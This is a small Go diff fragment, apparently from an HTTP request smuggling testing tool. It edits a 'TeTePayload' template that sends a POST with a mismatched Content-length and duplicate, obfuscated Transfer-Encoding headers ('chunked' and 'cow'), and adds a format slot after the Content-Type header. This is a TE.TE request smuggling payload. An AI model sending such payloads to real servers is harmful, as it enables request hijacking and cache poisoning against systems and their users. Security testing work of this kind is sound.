@@ -6,7 +6,7 @@ import (
 
 var TeTePayload = []string{`POST %s HTTP/1.1
 Host: %s
-Content-Type: application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded%s
 Content-length: 4
 Transfer-Encoding: chunked
 Transfer-encoding: cow
